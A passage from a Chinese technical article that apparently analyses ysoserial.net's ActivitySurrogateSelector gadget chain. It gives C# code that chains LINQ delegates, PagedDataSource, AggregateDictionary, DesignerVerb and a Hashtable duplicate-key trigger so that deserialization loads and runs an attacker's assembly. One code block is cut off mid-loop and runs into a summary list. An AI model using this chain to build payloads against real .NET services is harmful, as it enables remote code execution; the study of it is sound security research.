其中
    var q1 = from s in words
        where s.ToLower().Contains('o')
        select s;
用方法调用的形式可以表现为
    words.Where(s => s.ToLower().Contains('o')).Select(s=>s)
其中方法调用的形式叫做标准查询操作符，其定义如下：
以`public static IEnumerable Where(this IEnumerable
source, Func
predicate)`为例，第一个参数source是传入的集合即words，第二个参数predicate是`Func`类型的委托，用于对集合进行处理，并返回处理后的结果集合TSource。
在Where()和Select()两层处理的时候实际上是进行了两次委托处理，`s =>
s.ToLower().Contains('o')`和`s=>s`，传入的集合(参数)和传出的集合(结果)在Where()和Select()之间传递。
了解了这些之后我们还要了解一点，LINQ是延迟执行的。
    var q1 = from s in words
        where s.ToLower().Contains('o')
        select s;
这种定义只是声明了委托实例而已，并没有执行查询，只有select的时候才会从进行处理。
现在了解了LINQ和ActivitySurrogateSelector+ObjectSurrogate选择代理器之后，我们继续思考，在java中RMI的应用会在构造函数中执行Runtime.exec()，加载类之后会执行恶意命令。在C#中同理，如果我们可以加载自己的程序集，那么在new实例的时候触发构造函数同样会执行恶意代码。
如果我们替换了LINQ中的委托，通过替换委托来加载程序集并创建实例，那么触发LINQ之后就会执行恶意代码。由此思路，原作者设计了一条链
一步一步看，第一步代码实现如下
将e.dll通过Assembly.Load加载进来，Select()方法的委托传入`IEnumerable`数组传出`IEnumerable`
第二步，Assembly.GetTypes返回Type[]数组，并且没有输入参数，我们可以用`Delegate.CreateDelegate`创建一个委托
    Func> map_type = (Func>)Delegate.CreateDelegate(typeof(Func>), typeof(Assembly).GetMethod("GetTypes"));
类型为`Func>`，而`public virtual Type[]
GetTypes()`的签名返回的也是`Type[]`，然后配合SelectMany()拿到Assembly.GetTypes()。
    var e2 = e1.SelectMany(map_type);
    var e3 = e2.Select(Activator.CreateInstance);
最后Activator.CreateInstance创建实例就完成了整个LINQ的链。但是到这里LINQ并不会自动执行，因为我们上文提到了LINQ的延时执行特点，那么如何让LINQ自动枚举触发Assembly.Load，原作者的思路是找到一个反序列化时触发ToString()的，然后从ToString()到IEnumerable。
找到的链条如下：
    IEnumerable -> PagedDataSource -> ICollection
    ICollection -> AggregateDictionary -> IDictionary
    IDictionary -> DesignerVerb -> ToString
上文中的e3对象是一个`IEnumerable`类型，在PagedDataSource中DataSource对应。
而PagedDataSource实现了ICollection接口，然后将其转为IDictionary类型，找到AggregateDictionary
转为IDictionary类型之后又找到DesignerVerb类
他的this.Properties是MenuCommand类的Properties属性，类型为IDictionary。将它的Properties设置为AggregateDictionary对象，在ToString的时候就会触发LINQ。构造代码如下
    // PagedDataSource maps an arbitrary IEnumerable to an ICollection
    PagedDataSource pds = new PagedDataSource() { DataSource = e3 };
    // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
    // Class is internal so need to use reflection.
    IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);
    // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.
    verb = new DesignerVerb("", null);
    // Need to insert IDictionary using reflection.
    typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);
现在怎么触发ToString就是最后一步了。原作者利用的是Hashtable。在对Hashtable类进行反序列化期间，它将重建其密钥集，
如果两个键相等，则反序列化将失败，并且Hashtable会引发异常，从而导致运行[以下代码](https://github.com/Microsoft/referencesource/blob/4fe4349175f4c5091d972a7e56ea12012f1e7170/mscorlib/system/collections/hashtable.cs#L959)：
    // The current bucket is in use
    // OR
    // it is available, but has had the collision bit set and we have already found an available bucket
    if (((buckets[bucketNumber].hash_coll & 0x7FFFFFFF) == hashcode) && 
        KeyEquals (buckets[bucketNumber].key, key)) {
        if (add) {
            throw new ArgumentException(Environment.GetResourceString("Argument_AddingDuplicate__", buckets[bucketNumber].key, key));
        }
而在GetResourceString中
String.Format将value直接当作字符串返回，那么values会进行ToString()。构造代码
    ht = new Hashtable();
    ht.Add(verb, "");
    ht.Add("", "");
    FieldInfo fi_keys = ht.GetType().GetField("buckets", BindingFlags.NonPublic | BindingFlags.Instance);
    Array keys = (Array)fi_keys.GetValue(ht);
    FieldInfo fi_key = keys.GetType().GetElementType().GetField("key", BindingFlags.Public | BindingFlags.Instance);
    for (int i = 0; i  PagedDataSource -> ICollectionICollection -> AggregateDictionary -> IDictionary -> DesignerVerb -> ToString
  4. 通过HashTable键值重复触发报错进入ToString
  5. 然后用`System.Windows.Forms.AxHost.State`包装一下，try catch处理异常。
## AxHostState 攻击链
在上文中已经提到了`System.Windows.Forms.AxHost.State`的PropertyBagBinary字段会进行反序列化，ysoserial.net中将其用来解决ActivitySurrogateSelector报错的问题。
## ActivitySurrogateSelectorFromFile
这个其实也是ActivitySurrogateSelector利用链，只不过可以执行自己编写的程序集。下面的代码是接收参数并动态编译读取字节码存入自身assemblyBytes字段。
## ActivitySurrogateDisableTypeCheck
在dotnet4.8中，微软修复了对ActivitySurrogateSelector类的滥用，[代码在这里](https://github.com/microsoft/referencesource/blob/74eb1593e09a636270482f1c0525aabdccb1f364/System.Workflow.ComponentModel/AuthoringOM/Serializer/ActivitySurrogateSelector.cs#L123)